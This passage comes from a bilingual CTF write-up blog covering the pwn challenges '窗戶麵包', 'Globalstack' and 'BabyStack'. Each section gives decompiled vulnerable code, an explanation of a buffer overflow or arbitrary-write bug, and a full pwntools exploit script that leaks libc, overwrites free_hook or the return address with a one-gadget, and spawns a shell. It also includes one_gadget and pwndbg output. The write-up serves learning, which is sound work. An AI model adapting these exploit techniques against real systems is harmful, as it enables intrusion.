class="line"></span><br><span class="line">NAUPINFO(<span class="string">&quot;LEAKLIBC&quot;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&quot;LIBCBASE&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">NAUPINFO(<span class="string">&quot;FREEHOOK&quot;</span>,<span class="built_in">hex</span>(libc_freehook))</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>

<h2 id="窗戶麵包"><a href="#窗戶麵包" class="headerlink" title="窗戶麵包"></a>窗戶麵包</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  v0 = __acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">  setvbuf(v0, <span class="number">0LL</span>, <span class="number">4</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Something important: %p\n&quot;</span>, main);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you get the flag?&quot;</span>);</span><br><span class="line">  _read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有 buffer overflow 蓋 return address 控 rip 跳到 magic function(有給 main function address，通過計算 magic function 跟 main function offset 算出 magic address)</p>
<hr>
<p>There is a buffer overflow that overwrites the return address, controlling the rip to jump to the magic function. The address of the main function is provided, and by calculating the offset between the magic function and the main function, we can determine the magic function’s address.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">magic</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *param1, <span class="type">int</span> param2, <span class="type">const</span> <span class="type">char</span> *param3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(param1, <span class="string">&quot;B33F50UP&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( param2 == <span class="number">1337</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(param3, <span class="string">&quot;open_sesame&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;All parameters are correct. Opening shell...&quot;</span>);</span><br><span class="line">        WinExec(<span class="string">&quot;cmd.exe&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Parameter 3 is incorrect!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Parameter 2 is incorrect!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Parameter 1 is incorrect!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>這邊記得往後跳一點，跳過判斷式，就可以 get shell 了<br>如果有亂碼就下 <code>chcp 65001</code></p>
<hr>
<p>Remember to jump a bit further ahead to skip the conditional check, and you’ll be able to get the shell.<br>If you encounter any garbled characters, run <code>chcp 65001</code> to set the code page to UTF-8.</p>
<hr>
<p>My script</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;172.31.0.3&quot;</span>, <span class="number">56001</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">r.newline = <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Something important: &#x27;</span>)</span><br><span class="line">main = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main))</span><br><span class="line">magic = main - <span class="number">46</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Can you get the flag?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(magic))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="Globalstack"><a href="#Globalstack" class="headerlink" title="Globalstack"></a>Globalstack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int64_t</span> <span class="built_in">stack</span>[MAX_STACK_SIZE];</span><br><span class="line"><span class="type">int64_t</span>* top = <span class="built_in">stack</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;push&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(input, <span class="string">&quot;%*s %ld&quot;</span>, &amp;value) == <span class="number">1</span>) &#123;</span><br><span class="line">                top += <span class="number">1</span>;</span><br><span class="line">                *top = (<span class="type">int64_t</span>)value;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Pushed %ld to stack\n&quot;</span>, value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Invalid push.\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;pop&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Popped %ld from stack\n&quot;</span>, *top);</span><br><span class="line">            top -= <span class="number">1</span>;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>

<p>跟 <code>localstack</code>，不過這題不在 stack 上，GOT 上有libc，通過show leak libc，之後改 top (改成任意記憶體位置可以有任意寫) 到 free hook，並把 free hook 寫 one gadget，跳上去 get shell</p>
<hr>
<p>This is similar to <code>localstack</code>, but in this case, it’s not on the stack. The GOT contains a libc address. By using the show function, we can leak libc.<br>After that, we modify top (which allows us to write to any memory location) to point to the free_hook, then overwrite the free_hook with a one-gadget.<br>Finally, we jump to the one-gadget to get the shell.</p>
<hr>
<p>My script</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 172.31.1.2 11101&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;pop&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;show&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line">pop()</span><br><span class="line">show()</span><br><span class="line">rcu(<span class="string">b&#x27;Stack top: &#x27;</span>)</span><br><span class="line">leaklibc = <span class="built_in">int</span>(rcl().strip())</span><br><span class="line">libcbase = leaklibc - <span class="number">0x1ec980</span></span><br><span class="line"></span><br><span class="line">pop()</span><br><span class="line">pop()</span><br><span class="line">pop()</span><br><span class="line">pop()</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">rcu(<span class="string">b&#x27;Stack top: &#x27;</span>)</span><br><span class="line">leakPIE = <span class="built_in">int</span>(rcl().strip())</span><br><span class="line">PIEbase = leakPIE - <span class="number">0x4010</span></span><br><span class="line"></span><br><span class="line">libc_onegadget = libcbase + <span class="number">0xe3b01</span></span><br><span class="line">libc_freehook = libcbase + <span class="number">0x1eee48</span></span><br><span class="line"></span><br><span class="line">pop()</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;push &#x27;</span>+<span class="built_in">str</span>(libc_freehook).encode())</span><br><span class="line"></span><br><span class="line">pop()</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;push &#x27;</span>+<span class="built_in">str</span>(libc_onegadget).encode())</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&quot;LEAKLIBC&quot;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&quot;LIBCBASE&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">NAUPINFO(<span class="string">&quot;LEAKPIE&quot;</span>,<span class="built_in">hex</span>(leakPIE))</span><br><span class="line">NAUPINFO(<span class="string">&quot;PIEBASE&quot;</span>,<span class="built_in">hex</span>(PIEbase))</span><br><span class="line">NAUPINFO(<span class="string">&quot;ONEGADGET&quot;</span>,<span class="built_in">hex</span>(libc_onegadget))</span><br><span class="line">NAUPINFO(<span class="string">&quot;LIBC_FREE_HOOK&quot;</span>,<span class="built_in">hex</span>(libc_freehook))</span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">naup@naup-virtual-machine:~/Desktop/TSC/pwn/chal1/aaaaa$ one_gadget libc-2.31.so </span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL || r15 is a valid argv</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL || r15 is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x/30xg 0x555555557f90</span></span><br><span class="line"><span class="string">0x555555557f90 &lt;free@got[plt]&gt;:	0x00007ffff7e6f6d0	0x00007ffff7e59420</span></span><br><span class="line"><span class="string">0x555555557fa0 &lt;__stack_chk_fail@got.plt&gt;:	0x00007ffff7f04c90	0x00007ffff7e36c90 &lt;-</span></span><br><span class="line"><span class="string">0x555555557fb0 &lt;fgets@got[plt]&gt;:	0x00007ffff7e57630	0x00007ffff7f58df0</span></span><br><span class="line"><span class="string">0x555555557fc0 &lt;malloc@got[plt]&gt;:	0x00007ffff7e6f0e0	0x00007ffff7e38270</span></span><br><span class="line"><span class="string">0x555555557fd0 &lt;setvbuf@got[plt]&gt;:	0x00007ffff7e59ce0	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555557fe0:	0x00007ffff7df8f90	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555557ff0:	0x0000000000000000	0x00007ffff7e1bf10</span></span><br><span class="line"><span class="string">0x555555558000:	0x0000000000000000	0x0000555555558008</span></span><br><span class="line"><span class="string">0x555555558010 &lt;top&gt;:	0x0000555555558038	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555558020 &lt;stdout@@GLIBC_2.2.5&gt;:	0x00007ffff7fc26a0	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555558030 &lt;stdin@@GLIBC_2.2.5&gt;:	0x00007ffff7fc1980	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555558040 &lt;stack&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555558050 &lt;stack+16&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555558060 &lt;stack+32&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555558070 &lt;stack+48&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x555555557f98 &lt;puts@got[plt]&gt;:	0x00007ffff7e59420	0x00007ffff7f04c90</span></span><br><span class="line"><span class="string">0x555555557fa8 &lt;printf@got[plt]&gt;:	0x00007ffff7e36c90	0x00007ffff7e57630</span></span><br><span class="line"><span class="string">0x555555557fb8 &lt;strcmp@got[plt]&gt;:	0x00007ffff7f58df0	0x00007ffff7e6f0e0</span></span><br><span class="line"><span class="string">0x555555557fc8 &lt;__isoc99_sscanf@got.plt&gt;:	0x00007ffff7e38270	0x00007ffff7e59ce0</span></span><br><span class="line"><span class="string">0x555555557fd8:	0x0000000000000000	0x00007ffff7df8f90</span></span><br><span class="line"><span class="string">0x555555557fe8:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555557ff8:	0x00007ffff7e1bf10	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555558008:	0x0000555555558008	0x0000555555558038</span></span><br><span class="line"><span class="string">0x555555558018:	0x0000000000000000	0x00007ffff7fc26a0</span></span><br><span class="line"><span class="string">0x555555558028:	0x0000000000000000	0x00007ffff7fc1980</span></span><br><span class="line"><span class="string">0x555555558038 &lt;completed&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555558048 &lt;stack+8&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555558058 &lt;stack+24&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555558068 &lt;stack+40&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="BabyStack"><a href="#BabyStack" class="headerlink" title="BabyStack"></a>BabyStack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;| Show your skills !&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;| &gt; &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>, &amp;ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;| &gt; &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, ptr, <span class="number">0x10</span>);</span><br></pre></td></tr></table></figure>

<p>這裡有任意寫可以控 libc 裡面的 GOT，將 rsp 往上搬 0x58</p>
<hr>
<p>we have arbitrary write, which allows us to control the GOT inside libc. By moving the rsp up by 0x58</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;| Do you know how the stack works ?&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;| &gt; &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, ans0, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;| Do you know how the stack works ?&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;| &gt; &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, ans1, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;| Do you know how the stack works ?&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;| &gt; &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, ans2, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
<p>接下來在原本讓你輸入的地方會剛好在 rsp 所指的地方，ret繼續執行，這邊寫 onegadget(前面兩個 gadget 用來調整成 one gadget 條件)</p>
<hr>
<p>Next, the place where you were originally allowed to input will happen to be at the location pointed to by rsp. After the ret, execution continues. Here, we write the one-gadget (with the previous two gadgets used to adjust the conditions for the one-gadget).</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span 